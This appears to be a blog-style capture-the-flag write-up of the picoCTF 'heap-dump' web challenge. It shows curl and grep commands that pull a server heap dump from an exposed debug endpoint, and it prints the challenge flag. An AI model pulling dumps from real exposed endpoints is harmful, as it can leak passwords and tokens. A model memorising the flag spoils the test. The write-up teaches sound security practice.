---

title: "# heap-dump"
date: 2026-06-05
draft: false
tags: ["picoctf", "forensics", "metadata", "exiftool"]
------------------------------------------------------
# 🧩 Challenge Description
Explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a blog where one of the articles discusses API documentation. The goal is to find a file generated from the server’s memory that contains the flag.

A heap dump is a snapshot of a program’s memory (specifically, the heap section) at a particular point in time.
It typically contains:

## 📦 What’s Inside a Heap Dump?
Objects in memory: All the variables, strings, arrays, and data structures currently held.
References: Which object points to what (think of it like a web of connections).
Classes and metadata: Information about the type of each object.
Possibly sensitive data: Like passwords, tokens, flags (as you saw!), and session information.
## 🧠 Why Is It Useful?
For debugging memory leaks — you can see what’s not getting freed.
For performance analysis — spot which objects are hogging memory.
For security analysis — exposed heap dumps can reveal sensitive information.
# 🔍 Step-by-Step Solution

Clicking on the #API Documentation-link gives us the following information about the /heapdump endpoint

Access the endpoint
We can use curl to access the /headdump endoint
```
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2025/Web_Exploitation/head-dump]
└─$ curl http://verbal-sleep.picoctf.net:55492/heapdump   
{"snapshot":{"meta":{"node_fields":["type","name","id","self_size","edge_count","trace_node_id"],"node_types":[["hidden","array","string","object","code","closure","regexp","number","native","synthetic","concatenated string","sliced string","symbol","bigint"],"string","number","number","number","number","number"],"edge_fields":["type","name_or_index","to_node"],"edge_types":[["context","element","property","internal","hidden","shortcut","weak"],"string_or_number","node"],"trace_function_info_fields":["function_id","name","script_name","script_id","line","column"],"trace_node_fields":["id","function_info_index","count","size","children"],"sample_fields":["timestamp_us","last_assigned_id"],"location_fields":["object_index","script_id","line","column"]},"node_count":92685,"edge_count":389044,"trace_function_count":0},
"nodes":[9,1,1,0,314,0
,9,2,3,0,23,0
,9,3,5,0,1,0
,9,4,7,0,135,0
,9,5,9,0,555,0
,9,6,11,0,75,0
,9,7,13,0,0,0
,9,8,15,0,0,0
,9,9,17,0,241,0
<---snip--->
```
Get the flag  
This returns A LOT of information so let's grep for the flag.
```
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2025/Web_Exploitation/head-dump]
└─$ curl -s http://verbal-sleep.picoctf.net:55492/heapdump | grep -oE 'picoCTF{.*}'
```
picoCTF{Pat!3nt_15_Th3_K3y_388d10f7}

#  🧠  Conclusion of the Challenge
Developers accidentally exposed a heap dump on a live website.

You used your knowledge to discover the exposed endpoint and analyze the heapdump file.

You found a hidden flag inside the dump — proving that memory dumps must never be made public.

You learned how attackers could exploit misconfigured APIs or forgot


## 🧠 Key Takeaways
Aspect	What You Learned  
🔍 Reconnaissance	Explore the website fully, including hidden links like /api-docs/.  
⚙️ Swagger/API Docs	Swagger UI can unintentionally expose internal or debug endpoints.  
🧠 Heap Dump	A heap dump is a snapshot of server memory that can contain sensitive data such as flags, passwords, tokens, etc.  
🛠️ Command-Line Tools	Tools like curl, grep, and strings are powerful for finding valuable data in large responses.  
🚨 Security Flaws	Exposing debug tools like /heapdump in a live environment is a serious security vulnerability.  
